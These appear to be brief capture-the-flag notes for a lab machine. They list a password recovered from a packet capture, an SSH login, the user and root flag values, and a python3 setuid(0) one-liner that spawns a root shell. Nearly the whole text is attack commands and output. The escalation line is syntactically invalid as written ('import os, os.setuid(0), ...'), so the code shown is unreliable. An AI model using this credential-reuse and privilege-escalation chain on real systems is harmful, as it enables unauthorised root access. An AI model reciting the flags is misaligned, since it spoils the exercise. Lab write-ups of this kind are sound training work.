10.10.10.245/data/0 -> 0.pcap
=> user=nathan pwd=Buck3tH4TF0RM3!
=> ssh nathan@10.10.10.245 -> Buck3tH4TF0RM3!
=> cat user.txt
e021b8095321ceb6e42115834fb6e478
=> cd /
=> python3 -c 'import os, os.setuid(0), os.system("/bin/sh")'
=> whoami -> root
=> cat root/root.txt
ca6e7018ce4cac7f53fb881b6c8edd43
